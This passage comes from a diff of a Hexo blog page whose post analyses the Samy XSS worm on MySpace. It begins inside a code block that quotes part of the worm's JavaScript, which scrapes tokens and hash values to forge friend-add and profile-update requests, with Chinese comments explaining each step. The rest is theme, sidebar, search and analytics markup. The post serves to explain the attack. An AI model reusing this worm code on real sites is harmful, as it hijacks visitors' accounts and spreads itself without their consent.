'Submit';</span><br><span class="line">    AS['interest'] = AG;</span><br><span class="line">    AS['hash'] = getHiddenParame - ter(AU, 'hash');</span><br><span class="line">    httpSend(' / index.cfm ? fuseaction = profile.processInterests &amp; Mytoken = ' + AR,</span><br><span class="line">        nothing, 'POST', paramsToString(AS))</span><br><span class="line">&#125;</span><br><span class="line">function main() &#123;</span><br><span class="line">    var AN = getClientFID();</span><br><span class="line">    var BH = ' / index.cfm ? fuseaction = user.viewProfile &amp; friendID = ' + AN + ' &amp; Mytoken = ' + L;</span><br><span class="line">    J = getXMLObj();</span><br><span class="line">    httpSend(BH, getHome, 'GET'); // 发送get请求，处理函数为getHome，嵌入代码</span><br><span class="line">    xmlhttp2 = getXMLObj();</span><br><span class="line">    httpSend2(' / index.cfm ? fuseaction = invite.addfriend_verify &amp; friendID = 11851658 &amp; Mytoken = ' + L,</span><br><span class="line">        processxForm, 'GET') // 发送好友邀请</span><br><span class="line">&#125;</span><br><span class="line">function processx - Form() &#123;</span><br><span class="line">    if (xmlhttp2.readyState != 4) &#123;</span><br><span class="line">        return</span><br><span class="line">    &#125;</span><br><span class="line">    var AU = xmlhttp2.responseText;</span><br><span class="line">    var AQ = getHiddenParameter(AU, 'hashcode');</span><br><span class="line">    var AR = getFromURL(AU, 'Mytoken');</span><br><span class="line">    var AS = new Array();</span><br><span class="line">    AS['hashcode'] = AQ;</span><br><span class="line">    AS['friendID'] = '11851658';</span><br><span class="line">    AS['submit'] = 'Add to Friends';</span><br><span class="line">    httpSend2(' / index.cfm ? fuseaction = invite.addFriendsProcess &amp; Mytoken = ' + AR,</span><br><span class="line">        nothing, 'POST', paramsToString(AS))</span><br><span class="line">&#125;</span><br><span class="line">function httpSend2(BH, BI, BJ, BK) &#123;</span><br><span class="line">    if (!xmlhttp2) &#123;</span><br><span class="line">        return false</span><br><span class="line">    &#125;</span><br><span class="line">    eval('xmlhttp2.onr' + 'eadystatechange = BI');</span><br><span class="line">    xmlhttp2.open(BJ, BH, true);</span><br><span class="line">    if (BJ == 'POST') &#123;</span><br><span class="line">        xmlhttp2.setRequestHeader('Content - Type', 'application / x - www - form - urlencoded'); xmlhttp2.setRequestHeader('Content - Length', BK.length)</span><br><span class="line">    &#125;</span><br><span class="line">    xmlhttp2.send(BK); return true</span><br><span class="line">&#125;</span><br><span class="line">”&gt;<span class="tag">&lt;/<span class="name">DIV</span>&gt;</span></span><br></pre></td></tr></table></figure>
-      
     </div>
-    
-    
-    
 
     
-
     
-
     
-      <div>
-        <ul class="post-copyright">
+        
+
+<div>
+<ul class="post-copyright">
   <li class="post-copyright-author">
-    <strong>Post author:</strong>
-    Ray Sun
+    <strong>Post author:  </strong>Ray Sun
   </li>
   <li class="post-copyright-link">
-    <strong>Post link:</strong>
+    <strong>Post link: </strong>
     <a href="https://sunra.top/2021/09/19/xss-worm/" title="XSS 蠕虫定义与实战分析">https://sunra.top/2021/09/19/xss-worm/</a>
   </li>
   <li class="post-copyright-license">
-    <strong>Copyright Notice: </strong>
-    All articles in this blog are licensed under <a href="https://creativecommons.org/licenses/by-nc-sa/3.0/" rel="external nofollow noopener noreferrer" target="_blank">CC BY-NC-SA 3.0</a> unless stating additionally.
+    <strong>Copyright Notice:  </strong>All articles in this blog are licensed under <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" rel="external nofollow noopener noreferrer" target="_blank"><i class="fab fa-fw fa-creative-commons"></i>BY-NC-SA</a> unless stating additionally.
   </li>
 </ul>
-
-      </div>
-    
-
-    <footer class="post-footer">
-      
-
-      
-      
-      
-
-      
-        <div class="post-nav">
-          <div class="post-nav-next post-nav-item">
-            
-              <a href="/2021/09/10/xss-pseudo-protocol-and-code-bypass/" rel="next" title="伪协议与编码绕过">
-                <i class="fa fa-chevron-left"></i> 伪协议与编码绕过
-              </a>
-            
-          </div>
-
-          <span class="post-nav-divider"></span>
-
-          <div class="post-nav-prev post-nav-item">
-            
-              <a href="/2021/09/21/xss-template-inject-and-rce/" rel="prev" title="XSS 模版注入与远程代码执行">
-                XSS 模版注入与远程代码执行 <i class="fa fa-chevron-right"></i>
-              </a>
-            
-          </div>
-        </div>
-      
-
-      
-      
-    </footer>
-  </div>
-  
-  
-  
-  </article>
-
-
-
-    <div class="post-spread">
-      
-    </div>
-  </div>
-
-
-          </div>
-          
-
-
-          
-
-  
-    <div class="comments" id="comments">
-    </div>
-  
-
-
-
-        </div>
-        
-          
-  
-  <div class="sidebar-toggle">
-    <div class="sidebar-toggle-line-wrap">
-      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
-      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
-      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
-    </div>
-  </div>
-
-  <aside id="sidebar" class="sidebar">
-    
-    <div class="sidebar-inner">
-
-      
-
-      
-        <ul class="sidebar-nav motion-element">
-          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
-            Table of Contents
-          </li>
-          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
-            Overview
-          </li>
-        </ul>
-      
-
-      <section class="site-overview-wrap sidebar-panel">
-        <div class="site-overview">
-          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
-            
-              <img class="site-author-image" itemprop="image" src="https://res.cloudinary.com/dvtfhjxi4/image/upload/v1592617514/avatar_rpap6c.jpg" alt="Ray Sun">
-            
-              <p class="site-author-name" itemprop="name">Ray Sun</p>
-              <p class="site-description motion-element" itemprop="description"></p>
-          </div>
-
-          <nav class="site-state motion-element">
-
-            
-              <div class="site-state-item site-state-posts">
-              
-                <a href="/archives">
-              
-                  <span class="site-state-item-count">185</span>
-                  <span class="site-state-item-name">posts</span>
-                </a>
-              </div>
-            
-
-            
-              
-              
-              <div class="site-state-item site-state-categories">
-                <a href="/categories/index.html">
-                  <span class="site-state-item-count">15</span>
-                  <span class="site-state-item-name">categories</span>
-                </a>
-              </div>
-            
-
-            
-
-          </nav>
-
-          
-
-          
-            <div class="links-of-author motion-element">
-                
-                  <span class="links-of-author-item">
-                    <a href="https://github.com/Sun668" target="_blank" title="GitHub" rel="external nofollow noopener noreferrer">
-                      
-                        <i class="fa fa-fw fa-github"></i>GitHub</a>
-                  </span>
-                
-                  <span class="links-of-author-item">
-                    <a href="mailto:947692259@qq.com" target="_blank" title="E-Mail" rel="external nofollow noopener noreferrer">
-                      
-                        <i class="fa fa-fw fa-envelope"></i>E-Mail</a>
-                  </span>
-                
-            </div>
-          
-
-          
-          
-
-          
-          
-            <div class="links-of-blogroll motion-element links-of-blogroll-block">
-              <div class="links-of-blogroll-title">
-                <i class="fa  fa-fw fa-link"></i>
-                友情链接
-              </div>
-              <ul class="links-of-blogroll-list">
-                
-                  <li class="links-of-blogroll-item">
-                    <a rel="external nofollow noopener noreferrer" href="https://kingworker.cn/" title="人生思考 - 大树的个人随想" target="_blank">人生思考 - 大树的个人随想</a>
-                  </li>
-                
-              </ul>
-            </div>
-          
-
-          
-
-        </div>
-      </section>
-
-      
-      <!--noindex-->
-        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
-          <div class="post-toc">
-
-            
-              
-            
-
-            
-              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#定义"><span class="nav-number">1.</span> <span class="nav-text">定义</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#一般原理"><span class="nav-number">2.</span> <span class="nav-text">一般原理</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#第一个蠕虫：Samy"><span class="nav-number">3.</span> <span class="nav-text">第一个蠕虫：Samy</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#生效的前提，MySpace网站分析"><span class="nav-number">3.1.</span> <span class="nav-text">生效的前提，MySpace网站分析</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#源码分析"><span class="nav-number">3.2.</span> <span class="nav-text">源码分析</span></a></li></ol></li></ol></div>
-            
-
-          </div>
-        </section>
-      <!--/noindex-->
-      
-
-      
-
-    </div>
-  </aside>
-
-
-        
-      </div>
-    </main>
-
-    <footer id="footer" class="footer">
-      <div class="footer-inner">
-        <div class="copyright">&copy; <span itemprop="copyrightYear">2022</span>
-  <span class="with-love">
-    <i class="fa fa-user"></i>
-  </span>
-  <span class="author" itemprop="copyrightHolder">Ray Sun</span>
-
-  
 </div>
 
 
-  <div class="powered-by">Powered by <a rel="external nofollow noopener noreferrer" class="theme-link" target="_blank" href="https://hexo.io">Hexo</a></div>
-
-
-
-  <span class="post-meta-divider">|</span>
-
-
-
-  <div class="theme-info">Theme &mdash; <a class="theme-link" rel="external nofollow noopener noreferrer" _blank" href="https://github.com/iissnan/hexo-theme-next" target="_blank">NexT.Gemini</a> v5.1.4</div>
-
-
-
+      <footer class="post-footer">
 
         
 
 
-
-
-
-
-
         
-      </div>
-    </footer>
-
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2021/09/10/xss-pseudo-protocol-and-code-bypass/" rel="prev" title="伪协议与编码绕过">
+      <i class="fa fa-chevron-left"></i> 伪协议与编码绕过
+    </a></div>
+      <div class="post-nav-item">
+    <a href="/2021/09/21/xss-template-inject-and-rce/" rel="next" title="XSS 模版注入与远程代码执行">
+      XSS 模版注入与远程代码执行 <i class="fa fa-chevron-right"></i>
+    </a></div>
+    </div>
+      </footer>
     
-      <div class="back-to-top">
-        <i class="fa fa-arrow-up"></i>
-        
-      </div>
-    
-
-    
-
-  </div>
-
+  </article>
+  
+  
   
 
-<script type="text/javascript">
-  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
-    window.Promise = null;
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
   }
 </script>
 
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          Table of Contents
+        </li>
+        <li class="sidebar-nav-overview">
+          Overview
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#定义"><span class="nav-number">1.</span> <span class="nav-text">定义</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#一般原理"><span class="nav-number">2.</span> <span class="nav-text">一般原理</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#第一个蠕虫：Samy"><span class="nav-number">3.</span> <span class="nav-text">第一个蠕虫：Samy</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#生效的前提，MySpace网站分析"><span class="nav-number">3.1.</span> <span class="nav-text">生效的前提，MySpace网站分析</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#源码分析"><span class="nav-number">3.2.</span> <span class="nav-text">源码分析</span></a></li></ol></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="Ray Sun" src="https://res.cloudinary.com/dvtfhjxi4/image/upload/v1592617514/avatar_rpap6c.jpg">
+  <p class="site-author-name" itemprop="name">Ray Sun</p>
+  <div class="site-description" itemprop="description">拨开互联网的迷雾</div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">185</span>
+          <span class="site-state-item-name">posts</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/categories/">
+          
+        <span class="site-state-item-count">15</span>
+        <span class="site-state-item-name">categories</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author motion-element">
+      <span class="links-of-author-item">
+        <a href="https://github.com/Sun668" title="GitHub → https://github.com/Sun668" rel="external nofollow noopener noreferrer" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="mailto:947692259@qq.com" title="E-Mail → mailto:947692259@qq.com" rel="external nofollow noopener noreferrer" target="_blank"><i class="fa fa-envelope fa-fw"></i>E-Mail</a>
+      </span>
+  </div>
+  <div class="cc-license motion-element" itemprop="license">
+    <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" class="cc-opacity" rel="external nofollow noopener noreferrer" target="_blank"><img src="/images/cc-by-nc-sa.svg" alt="Creative Commons"></a>
+  </div>
+
+
+  <div class="links-of-blogroll motion-element">
+    <div class="links-of-blogroll-title"><i class="fa fa-link fa-fw"></i>
+      友情链接
+    </div>
+    <ul class="links-of-blogroll-list">
+        <li class="links-of-blogroll-item">
+          <a href="https://kingworker.cn/" title="https://kingworker.cn/" rel="external nofollow noopener noreferrer" target="_blank">大树的个人随想</a>
+        </li>
+    </ul>
+  </div>
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2022</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Ray Sun</span>
+</div>
+
+        
 
 
 
 
 
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+<script src="/js/utils.js"></script><script src="/js/motion.js"></script>
+<script src="/js/schemes/muse.js"></script>
+<script src="/js/next-boot.js"></script>
 
 
 
   
-
-
-
-
-
-
-
-
-
-
-
-
-  
-  
-    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
-  
-
-  
-  
-    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
-  
-
-  
-  
-    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
-  
-
-  
-  
-    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
-  
-
-  
-  
-    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
-  
-
-  
-  
-    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
-  
-
-
-  
-
-
-  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
-
-  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
-
-
-
-  
-  
-
-
-  <script type="text/javascript" src="/js/src/affix.js?v=5.1.4"></script>
-
-  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=5.1.4"></script>
-
-
-
-  
-  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
-<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
-
-
-
-  
-
-
-  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
-
-
-
-  
-
-
-  
-
-
-
-
-	
-
-
-
-
-
-  
-
-
-
-
-
-  
-
-
-
-
-
-
-
-
-
-
-
-
-  
-
-  <script type="text/javascript">
-    // Popup Window;
-    var isfetched = false;
-    var isXml = true;
-    // Search DB path;
-    var search_path = "search.xml";
-    if (search_path.length === 0) {
-      search_path = "search.xml";
-    } else if (/json$/i.test(search_path)) {
-      isXml = false;
-    }
-    var path = "/" + search_path;
-    // monitor main search box;
-
-    var onPopupClose = function (e) {
-      $('.popup').hide();
-      $('#local-search-input').val('');
-      $('.search-result-list').remove();
-      $('#no-result').remove();
-      $(".local-search-pop-overlay").remove();
-      $('body').css('overflow', '');
-    }
-
-    function proceedsearch() {
-      $("body")
-        .append('<div class="search-popup-overlay local-search-pop-overlay"></div>')
-        .css('overflow', 'hidden');
-      $('.search-popup-overlay').click(onPopupClose);
-      $('.popup').toggle();
-      var $localSearchInput = $('#local-search-input');
-      $localSearchInput.attr("autocapitalize", "none");
-      $localSearchInput.attr("autocorrect", "off");
-      $localSearchInput.focus();
-    }
-
-    // search function;
-    var searchFunc = function(path, search_id, content_id) {
-      'use strict';
-
-      // start loading animation
-      $("body")
-        .append('<div class="search-popup-overlay local-search-pop-overlay">' +
-          '<div id="search-loading-icon">' +
-          '<i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>' +
-          '</div>' +
-          '</div>')
-        .css('overflow', 'hidden');
-      $("#search-loading-icon").css('margin', '20% auto 0 auto').css('text-align', 'center');
-
-      $.ajax({
-        url: path,
-        dataType: isXml ? "xml" : "json",
-        async: true,
-        success: function(res) {
-          // get the contents from search data
-          isfetched = true;
-          $('.popup').detach().appendTo('.header-inner');
-          var datas = isXml ? $("entry", res).map(function() {
-            return {
-              title: $("title", this).text(),
-              content: $("content",this).text(),
-              url: $("url" , this).text()
-            };
-          }).get() : res;
-          var input = document.getElementById(search_id);
-          var resultContent = document.getElementById(content_id);
-          var inputEventFunction = function() {
-            var searchText = input.value.trim().toLowerCase();
-            var keywords = searchText.split(/[\s\-]+/);
-            if (keywords.length > 1) {
-              keywords.push(searchText);
-            }
-            var resultItems = [];
-            if (searchText.length > 0) {
-              // perform local searching
-              datas.forEach(function(data) {
-                var isMatch = false;
-                var hitCount = 0;
-                var searchTextCount = 0;
-                var title = data.title.trim();
-                var titleInLowerCase = title.toLowerCase();
-                var content = data.content.trim().replace(/<[^>]+>/g,"");
-                var contentInLowerCase = content.toLowerCase();
-                var articleUrl = decodeURIComponent(data.url);
-                var indexOfTitle = [];
-                var indexOfContent = [];
-                // only match articles with not empty titles
-                if(title != '') {
-                  keywords.forEach(function(keyword) {
-                    function getIndexByWord(word, text, caseSensitive) {
-                      var wordLen = word.length;
-                      if (wordLen === 0) {
-                        return [];
-                      }
-                      var startPosition = 0, position = [], index = [];
-                      if (!caseSensitive) {
-                        text = text.toLowerCase();
-                        word = word.toLowerCase();
-                      }
-                      while ((position = text.indexOf(word, startPosition)) > -1) {
-                        index.push({position: position, word: word});
-                        startPosition = position + wordLen;
-                      }
-                      return index;
-                    }
-
-                    indexOfTitle = indexOfTitle.concat(getIndexByWord(keyword, titleInLowerCase, false));
-                    indexOfContent = indexOfContent.concat(getIndexByWord(keyword, contentInLowerCase, false));
-                  });
-                  if (indexOfTitle.length > 0 || indexOfContent.length > 0) {
-                    isMatch = true;
-                    hitCount = indexOfTitle.length + indexOfContent.length;
-                  }
-                }
-
-                // show search results
-
-                if (isMatch) {
-                  // sort index by position of keyword
-
-                  [indexOfTitle, indexOfContent].forEach(function (index) {
-                    index.sort(function (itemLeft, itemRight) {
-                      if (itemRight.position !== itemLeft.position) {
-                        return itemRight.position - itemLeft.position;
-                      } else {
-                        return itemLeft.word.length - itemRight.word.length;
-                      }
-                    });
-                  });
-
-                  // merge hits into slices
-
-                  function mergeIntoSlice(text, start, end, index) {
-                    var item = index[index.length - 1];
-                    var position = item.position;
-                    var word = item.word;
-                    var hits = [];
-                    var searchTextCountInSlice = 0;
-                    while (position + word.length <= end && index.length != 0) {
-                      if (word === searchText) {
-                        searchTextCountInSlice++;
-                      }
-                      hits.push({position: position, length: word.length});
-                      var wordEnd = position + word.length;
-
-                      // move to next position of hit
-
-                      index.pop();
-                      while (index.length != 0) {
-                        item = index[index.length - 1];
-                        position = item.position;
-                        word = item.word;
-                        if (wordEnd > position) {
-                          index.pop();
-                        } else {
-                          break;
-                        }
-                      }
-                    }
-                    searchTextCount += searchTextCountInSlice;
-                    return {
-                      hits: hits,
-                      start: start,
-                      end: end,
-                      searchTextCount: searchTextCountInSlice
-                    };
-                  }
-
-                  var slicesOfTitle = [];
-                  if (indexOfTitle.length != 0) {
-                    slicesOfTitle.push(mergeIntoSlice(title, 0, title.length, indexOfTitle));
-                  }
-
-                  var slicesOfContent = [];
-                  while (indexOfContent.length != 0) {
-                    var item = indexOfContent[indexOfContent.length - 1];
-                    var position = item.position;
-                    var word = item.word;
-                    // cut out 100 characters
-                    var start = position - 20;
-                    var end = position + 80;
-                    if(start < 0){
-                      start = 0;
-                    }
-                    if (end < position + word.length) {
-                      end = position + word.length;
-                    }
-                    if(end > content.length){
-                      end = content.length;
-                    }
-                    slicesOfContent.push(mergeIntoSlice(content, start, end, indexOfContent));
-                  }
-
-                  // sort slices in content by search text's count and hits' count
-
-                  slicesOfContent.sort(function (sliceLeft, sliceRight) {
-                    if (sliceLeft.searchTextCount !== sliceRight.searchTextCount) {
-                      return sliceRight.searchTextCount - sliceLeft.searchTextCount;
-                    } else if (sliceLeft.hits.length !== sliceRight.hits.length) {
-                      return sliceRight.hits.length - sliceLeft.hits.length;
-                    } else {
-                      return sliceLeft.start - sliceRight.start;
-                    }
-                  });
-
-                  // select top N slices in content
-
-                  var upperBound = parseInt('1');
-                  if (upperBound >= 0) {
-                    slicesOfContent = slicesOfContent.slice(0, upperBound);
-                  }
-
-                  // highlight title and content
-
-                  function highlightKeyword(text, slice) {
-                    var result = '';
-                    var prevEnd = slice.start;
-                    slice.hits.forEach(function (hit) {
-                      result += text.substring(prevEnd, hit.position);
-                      var end = hit.position + hit.length;
-                      result += '<b class="search-keyword">' + text.substring(hit.position, end) + '</b>';
-                      prevEnd = end;
-                    });
-                    result += text.substring(prevEnd, slice.end);
-                    return result;
-                  }
-
-                  var resultItem = '';
-
-                  if (slicesOfTitle.length != 0) {
-                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + highlightKeyword(title, slicesOfTitle[0]) + "</a>";
-                  } else {
-                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + title + "</a>";
-                  }
-
-                  slicesOfContent.forEach(function (slice) {
-                    resultItem += "<a href='" + articleUrl + "'>" +
-                      "<p class=\"search-result\">" + highlightKeyword(content, slice) +
-                      "...</p>" + "</a>";
-                  });
-
-                  resultItem += "</li>";
-                  resultItems.push({
-                    item: resultItem,
-                    searchTextCount: searchTextCount,
-                    hitCount: hitCount,
-                    id: resultItems.length
-                  });
-                }
-              })
-            };
-            if (keywords.length === 1 && keywords[0] === "") {
-              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-search fa-5x" /></div>'
-            } else if (resultItems.length === 0) {
-              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-frown-o fa-5x" /></div>'
-            } else {
-              resultItems.sort(function (resultLeft, resultRight) {
-                if (resultLeft.searchTextCount !== resultRight.searchTextCount) {
-                  return resultRight.searchTextCount - resultLeft.searchTextCount;
-                } else if (resultLeft.hitCount !== resultRight.hitCount) {
-                  return resultRight.hitCount - resultLeft.hitCount;
-                } else {
-                  return resultRight.id - resultLeft.id;
-                }
-              });
-              var searchResultList = '<ul class=\"search-result-list\">';
-              resultItems.forEach(function (result) {
-                searchResultList += result.item;
-              })
-              searchResultList += "</ul>";
-              resultContent.innerHTML = searchResultList;
-            }
-          }
-
-          if ('auto' === 'auto') {
-            input.addEventListener('input', inputEventFunction);
-          } else {
-            $('.search-icon').click(inputEventFunction);
-            input.addEventListener('keypress', function (event) {
-              if (event.keyCode === 13) {
-                inputEventFunction();
-              }
-            });
-          }
-
-          // remove loading animation
-          $(".local-search-pop-overlay").remove();
-          $('body').css('overflow', '');
-
-          proceedsearch();
-        }
-      });
-    }
-
-    // handle and trigger popup window;
-    $('.popup-trigger').click(function(e) {
-      e.stopPropagation();
-      if (isfetched === false) {
-        searchFunc(path, 'local-search-input', 'local-search-result');
-      } else {
-        proceedsearch();
-      };
-    });
-
-    $('.popup-btn-close').click(onPopupClose);
-    $('.popup').click(function(e){
-      e.stopPropagation();
-    });
-    $(document).on('keyup', function (event) {
-      var shouldDismissSearchPopup = event.which === 27 &&
-        $('.search-popup').is(':visible');
-      if (shouldDismissSearchPopup) {
-        onPopupClose();
-      }
-    });
+  <script>
+    (function(){
+      var canonicalURL, curProtocol;
+      //Get the <link> tag
+      var x=document.getElementsByTagName("link");
+		//Find the last canonical URL
+		if(x.length > 0){
+			for (i=0;i<x.length;i++){
+				if(x[i].rel.toLowerCase() == 'canonical' && x[i].href){
+					canonicalURL=x[i].href;
+				}
+			}
+		}
+    //Get protocol
+	    if (!canonicalURL){
+	    	curProtocol = window.location.protocol.split(':')[0];
+	    }
+	    else{
+	    	curProtocol = canonicalURL.split(':')[0];
+	    }
+      //Get current URL if the canonical URL does not exist
+	    if (!canonicalURL) canonicalURL = window.location.href;
+	    //Assign script content. Replace current URL with the canonical URL
+      !function(){var e=/([http|https]:\/\/[a-zA-Z0-9\_\.]+\.baidu\.com)/gi,r=canonicalURL,t=document.referrer;if(!e.test(r)){var n=(String(curProtocol).toLowerCase() === 'https')?"https://sp0.baidu.com/9_Q4simg2RQJ8t7jm9iCKT-xh_/s.gif":"//api.share.baidu.com/s.gif";t?(n+="?r="+encodeURIComponent(document.referrer),r&&(n+="&l="+r)):r&&(n+="?l="+r);var i=new Image;i.src=n}}(window);})();
   </script>
 
 
 
 
-
-  
-
-  
-
-  
-<script>
-(function(){
-    var bp = document.createElement('script');
-    var curProtocol = window.location.protocol.split(':')[0];
-    if (curProtocol === 'https') {
-        bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';        
-    }
-    else {
-        bp.src = 'http://push.zhanzhang.baidu.com/push.js';
-    }
-    var s = document.getElementsByTagName("script")[0];
-    s.parentNode.insertBefore(bp, s);
-})();
-</script>
+  <script src="/js/local-search.js"></script>
 
 
-  
-  
+
+
+
+
+
+
+
+
+
 
   
 
